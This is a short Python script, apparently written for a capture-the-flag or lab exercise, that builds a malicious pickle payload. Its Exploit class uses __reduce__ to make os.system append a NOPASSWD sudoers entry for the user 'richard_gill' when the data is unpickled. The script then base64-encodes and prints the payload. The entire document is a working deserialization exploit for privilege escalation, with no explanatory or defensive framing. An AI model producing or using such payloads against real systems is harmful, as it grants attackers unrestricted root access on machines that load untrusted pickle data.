import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo "richard_gill ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers',))

# Create the malicious pickle
payload = pickle.dumps(Exploit())

# Base64 encode the pickle
encoded_payload = base64.b64encode(payload).decode()

# Print the encoded payload
print(encoded_payload)
